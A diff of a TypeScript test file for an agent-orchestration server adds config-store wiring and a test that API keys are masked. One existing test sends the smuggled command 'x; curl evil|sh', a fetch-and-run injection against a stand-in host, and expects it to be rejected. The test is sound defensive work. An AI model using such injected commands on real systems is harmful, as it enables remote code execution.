@@ -11,12 +11,13 @@ import { AgentStore } from '../../src/store/agentStore.js';
 import { SpawnService } from '../../src/spawn/spawn.js';
 import { MissionEngine } from '../../src/overseer/missionEngine.js';
 import { FakeClock } from '../../src/shared/clock.js';
+import { ConfigStore } from '../../src/store/configStore.js';
 
 function makeApp() {
   const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'orca','/o')").run();
   const tasks = new TaskStore(db);
   const bus = new EventBus();
-  const a = createServer({ tasks, readiness: new Readiness(db), missions: new MissionStore(db), bus, engine: null as any, spawn: null as any, tmux: null as any, project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0) });
+  const a = createServer({ tasks, readiness: new Readiness(db), missions: new MissionStore(db), bus, engine: null as any, spawn: null as any, tmux: null as any, project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config: new ConfigStore(db) });
   return { app: a, bus };
 }
 
@@ -54,7 +55,7 @@ it('POST /tasks with body {title} generates an id and sets status open', async (
   const app = createServer({
     tasks, readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
     engine: null as any, spawn: null as any, tmux: null as any,
-    project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0),
+    project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config: new ConfigStore(db),
   });
   const res = await app.request('/tasks', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ title: 'From UI' }) });
   expect(res.status).toBe(201);
@@ -73,7 +74,7 @@ it('POST /sessions with invalid exec returns 400 and spawns nothing', async () =
   const app = createServer({
     tasks, readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
     engine: null as any, spawn: new SpawnService({ tmux, agents: new AgentStore(db) }), tmux,
-    project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0),
+    project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config: new ConfigStore(db),
   });
   const res = await app.request('/sessions', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ taskId: 'orca-1', exec: 'x; curl evil|sh' }) });
   expect(res.status).toBe(400);
@@ -88,7 +89,7 @@ it('POST /sessions launches an agent on a task and marks it in_progress', async 
   const app = createServer({
     tasks, readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
     engine: null as any, spawn: new SpawnService({ tmux, agents: new AgentStore(db) }), tmux,
-    project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0),
+    project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config: new ConfigStore(db),
   });
   const res = await app.request('/sessions', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ taskId: 'orca-1', exec: 'ollama/deepseek-v4-flash' }) });
   expect(res.status).toBe(201);
@@ -106,7 +107,7 @@ it('PATCH /missions/:id pauses (drops from active) and resumes', async () => {
   const engine = { tick: async () => {} } as unknown as MissionEngine;
   const app = createServer({
     tasks: new TaskStore(db), readiness: new Readiness(db), missions, bus: new EventBus(),
-    engine, spawn: null as any, tmux, project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0),
+    engine, spawn: null as any, tmux, project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config: new ConfigStore(db),
   });
   await app.request('/missions/m1', { method: 'PATCH', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ action: 'pause' }) });
   expect((await (await app.request('/missions')).json())).toEqual([]); // paused → not active
@@ -121,7 +122,7 @@ it('GET /sessions/:name/stream survives a dead/missing session (empty pane)', as
   const app = createServer({
     tasks: new TaskStore(db), readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
     engine: null as any, spawn: null as any, tmux, project: { id: 1, path: '/o' },
-    fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0),
+    fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config: new ConfigStore(db),
   });
   const ctrl = new AbortController();
   const res = await app.request('/sessions/orca-dead/stream', { signal: ctrl.signal });
@@ -142,7 +143,7 @@ it('GET /sessions/:name/stream emits a first pane frame', async () => {
   const app = createServer({
     tasks: new TaskStore(db), readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
     engine: null as any, spawn: null as any, tmux, project: { id: 1, path: '/o' },
-    fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0),
+    fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config: new ConfigStore(db),
   });
   const ctrl = new AbortController();
   const res = await app.request('/sessions/orca-A/stream', { signal: ctrl.signal });
@@ -154,4 +155,20 @@ it('GET /sessions/:name/stream emits a first pane frame', async () => {
   expect(text).toContain('event: pane');
   expect(text).toContain('hello-pane');
   ctrl.abort(); await reader.cancel();
+});
+
+it('GET /config returns masked config; PUT updates without exposing the key', async () => {
+  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'orca','/o')").run();
+  const config = new ConfigStore(db);
+  const app = createServer({
+    tasks: new TaskStore(db), readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
+    engine: null as any, spawn: null as any, tmux: new FakeTmuxDriver(), project: { id: 1, path: '/o' },
+    fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config,
+  });
+  const put = await app.request('/config', { method: 'PUT', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ allowedExecs: ['sonnet'], autopilot: { apiKey: 'sk-secret' } }) });
+  expect(put.status).toBe(200);
+  const get = await (await app.request('/config')).json();
+  expect(get.allowedExecs).toEqual(['sonnet']);
+  expect(get.autopilot.apiKeySet).toBe(true);
+  expect(JSON.stringify(get)).not.toContain('sk-secret');
 });
